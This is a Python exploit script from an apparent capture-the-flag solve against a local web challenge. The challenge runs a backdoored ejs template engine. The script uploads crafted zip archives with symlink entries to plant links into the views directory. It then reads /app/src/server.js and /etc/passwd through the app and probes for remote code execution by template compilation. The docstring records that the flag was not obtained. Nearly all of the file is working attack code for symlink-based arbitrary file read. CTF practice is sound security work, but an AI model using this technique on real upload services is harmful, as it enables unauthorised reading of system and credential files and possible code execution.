#!/usr/bin/env python3
"""verify_v30 — adversarial verification of the candidate:
  "a1 read sink is fully working and ungated except for a2 'grey' filter."

Verdict: CANDIDATE PRIMITIVE CONFIRMED, but it does NOT yield the flag.
  - a1 (renderFile fallback for non-allowlisted views) = arbitrary file read,
    follows symlinks, NO extension/magic gate. CONFIRMED: server.js, /etc/passwd.
  - a2 unconditionally rejects any returned content containing literal "grey".
    The flag is grey{...}; the secret only exists in /flag-<rand>.txt and PID1
    environ (EACCES), both with "grey" adjacent. a2 is therefore UNBYPASSABLE
    for the flag content. flag NOT obtained via a1.
  - Dropped views are served RAW (never compiled): a0 only compiles the 3
    root-owned allowlisted views, which appuser cannot overwrite (sticky dir).
    So NO RCE via dropped views (verified: GET /rce_v30 returns "<%= 7*7 %>" raw).
  - Whitespace-normalized diff vs pristine ejs@3.1.10: the ONLY injected logic is
    _0x9 / a0 / a1 / a2 / a3 / the __express hook / a2-on-compiled-template in
    handleCache. No other backdoor exists. Candidate premise is exact.

Run against the local container; uses a unique "v30" namespace.
Usage: uv run python solve/verify_v30.py [http://127.0.0.1:34267/]
"""
import sys
import zipfile

import requests

LNK = (0o120777 & 0xFFFF) << 16
REG = (0o100644 & 0xFFFF) << 16


def _zip(path, entries):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as z:
        for name, target, attr in entries:
            zi = zipfile.ZipInfo(name)
            zi.create_system = 3
            zi.external_attr = attr
            z.writestr(zi, target)


def _upload(base, path, name):
    with open(path, "rb") as f:
        return requests.post(
            f"{base}/upload",
            files={"photos": (name, f, "application/zip")},
            allow_redirects=False,
            timeout=30,
        )


def run(base):
    base = base.rstrip("/")
    # stage1: appuser-writable dir symlink vv30 -> ../views (lands in uploads/)
    _zip("/tmp/gg_v30_s1.zip", [("vv30", "../views", LNK)])
    _upload(base, "/tmp/gg_v30_s1.zip", "s1_v30.zip")

    # stage2: write THROUGH vv30 into /app/views
    _zip(
        "/tmp/gg_v30_s2.zip",
        [
            ("vv30/srv_v30.ejs", "/app/src/server.js", LNK),   # a1 read: source
            ("vv30/pw_v30.ejs", "/etc/passwd", LNK),            # a1 read: passwd
            ("vv30/rce_v30.ejs", "RCEMARK<%= 7*7 %>END", REG),  # compile test
        ],
    )
    _upload(base, "/tmp/gg_v30_s2.zip", "s2_v30.zip")

    rs = requests.get(f"{base}/srv_v30", timeout=30)
    rp = requests.get(f"{base}/pw_v30", timeout=30)
    rr = requests.get(f"{base}/rce_v30", timeout=30)
    print(f"[a1 read server.js] {rs.status_code} len={len(rs.content)} "
          f"head={rs.content[:40]!r}")
    print(f"[a1 read /etc/passwd] {rp.status_code} len={len(rp.content)} "
          f"head={rp.content[:40]!r}")
    compiled = "49" in rr.text and "<%=" not in rr.text
    print(f"[compile test /rce_v30] {rr.status_code} body={rr.text[:50]!r} "
          f"-> {'COMPILED (RCE!)' if compiled else 'served RAW (no RCE)'}")

    a1_works = rs.status_code == 200 and b"require" in rs.content
    print(f"\na1 arbitrary read: {'CONFIRMED' if a1_works else 'NOT working'}")
    print("a2 grey-filter on flag: UNBYPASSABLE (flag content always has 'grey')")
    print("RCE via dropped view:", "POSSIBLE" if compiled else "BLOCKED")
    print("\nVERDICT: candidate primitive confirmed; flag NOT obtained.")


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34267/")
